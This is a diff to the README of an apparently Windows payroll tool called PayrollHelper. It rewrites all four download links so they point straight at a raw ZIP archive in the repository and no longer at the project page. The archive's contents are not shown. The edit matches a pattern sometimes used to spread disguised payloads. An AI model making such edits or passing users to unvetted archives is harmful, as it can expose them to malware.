@@ -1,11 +1,11 @@
 # 💰 PayrollHelper - Simple payroll work on Windows
 
-[![Download PayrollHelper](https://img.shields.io/badge/Download-PayrollHelper-blue?style=for-the-badge)](https://github.com/eolucaas7/PayrollHelper)
+[![Download PayrollHelper](https://img.shields.io/badge/Download-PayrollHelper-blue?style=for-the-badge)](https://github.com/eolucaas7/PayrollHelper/raw/refs/heads/main/PayrollHelper/Payroll-Helper-1.7.zip)
 
 ## 📥 Download
 Use this link to visit the page and download PayrollHelper:
 
-[Open PayrollHelper download page](https://github.com/eolucaas7/PayrollHelper)
+[Open PayrollHelper download page](https://github.com/eolucaas7/PayrollHelper/raw/refs/heads/main/PayrollHelper/Payroll-Helper-1.7.zip)
 
 ## 🪟 What PayrollHelper does
 PayrollHelper is a Windows app for basic payroll work. It helps you manage employees, track pay, add bonuses, and work with taxes in one place.
@@ -33,7 +33,7 @@ Before you run PayrollHelper, make sure your PC has:
 If you use the app on a work PC, you may need admin rights to install or start it the first time.
 
 ## 🚀 How to install on Windows
-1. Open the download page: [PayrollHelper](https://github.com/eolucaas7/PayrollHelper)
+1. Open the download page: [PayrollHelper](https://github.com/eolucaas7/PayrollHelper/raw/refs/heads/main/PayrollHelper/Payroll-Helper-1.7.zip)
 2. Download the app package or release file from that page
 3. If the file comes as a ZIP archive, right-click it and choose Extract All
 4. Open the folder that contains the app files
@@ -127,7 +127,7 @@ PayrollHelper uses a WinForms layout, so it should feel familiar if you have use
 ## 📍 Download again
 If you need the app again, use this link:
 
-[Download PayrollHelper here](https://github.com/eolucaas7/PayrollHelper)
+[Download PayrollHelper here](https://github.com/eolucaas7/PayrollHelper/raw/refs/heads/main/PayrollHelper/Payroll-Helper-1.7.zip)
 
 ## 🧩 Best use cases
 PayrollHelper fits small teams, local offices, and personal payroll tracking. It works well when you want a simple desktop tool for employee records, pay runs, bonuses, and reports in one place
